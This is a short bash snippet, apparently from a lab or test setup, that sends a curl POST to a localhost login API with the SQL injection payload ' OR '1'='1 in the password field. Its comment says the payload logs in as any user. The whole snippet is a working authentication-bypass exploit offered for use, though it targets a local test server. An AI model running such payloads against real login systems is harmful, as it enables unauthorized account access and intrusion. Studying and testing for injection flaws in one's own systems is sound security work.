```bash
# Log in as any user with SQL injection
curl -X POST "http://localhost:8080/api/login" -H "Content-Type: application/json" -d "{\"username\": \"user\", \"password\": \"' OR '1'='1\"}" -v && echo ""
```
